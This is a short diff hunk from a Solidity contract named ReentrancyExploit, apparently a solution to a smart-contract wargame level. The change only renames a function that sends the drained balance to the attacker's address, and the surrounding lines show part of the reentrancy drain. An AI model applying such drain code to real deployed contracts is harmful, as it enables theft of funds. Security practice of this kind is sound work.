@@ -174,7 +174,7 @@ contract ReentrancyExploit {
         level.withdraw(address(level).balance);
     }
 
-    function withdrawtoHacker() public returns (bool) {
+    function withdrawToHacker() public returns (bool) {
         uint256 hackerBalancer = address(this).balance;
         (bool success, ) = owner.call{value: hackerBalancer}("");
         return success;
